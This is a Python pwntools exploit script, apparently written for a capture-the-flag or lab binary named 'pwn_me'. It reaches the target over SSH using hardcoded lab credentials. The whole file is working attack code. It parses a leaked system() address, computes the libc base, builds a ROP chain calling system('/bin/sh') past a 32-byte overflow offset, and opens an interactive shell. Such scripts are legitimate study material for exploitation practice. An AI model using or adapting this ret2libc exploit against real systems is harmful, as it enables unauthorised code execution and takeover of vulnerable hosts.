#!/usr/bin/python3
# Author: Hack.You
from pwn import *
import warnings
import re

# Binary filename
exe = './pwn_me'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

if args.REMOTE:
 ssh_session = ssh(host='10.10.34.144', user='guardian', password='GOg0esGrrr!')
 io = ssh_session.process(exe)
else:
 io = elf.process()

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

libc = ELF('libc.so.6')
#libc = elf.libc

offset = 32

# Get system address
io.recvuntil('System is at:')
leak = io.recv()
address = re.findall(rb'0x[0-9a-zA-Z]+', leak)
system = address[0]
log.info(f"Leaked system address: { system } ")

# Calculate libc base address
libc.address = int(system, 16) - libc.symbols['system']
log.info(f"Libc base address: { hex(libc.address) } ")

rop = ROP(libc)
sh = next(libc.search(b'/bin/sh\x00'))
shell = rop.system(sh)
chain = rop.chain()
pprint(rop.dump())

# Build the payload
payload = flat({
    offset: [
        chain
    ]
})

io.sendline(payload)
io.interactive()
